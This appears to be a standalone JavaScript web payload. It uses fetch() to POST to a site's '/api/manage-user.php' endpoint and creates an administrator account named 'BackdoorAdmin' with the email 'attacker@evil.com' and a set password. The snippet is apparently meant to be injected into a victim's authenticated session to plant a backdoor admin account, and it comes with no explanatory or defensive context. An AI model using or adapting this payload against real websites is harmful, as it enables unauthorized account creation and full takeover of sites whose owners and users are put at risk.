fetch("/api/manage-user.php", {
  headers: {
    "Content-Type": "application/x-www-form-urlencoded"
  },
  body: "display_name=BackdoorAdmin&role=admin&email=attacker@evil.com&password=Compromised1!",
  method: "POST"
});
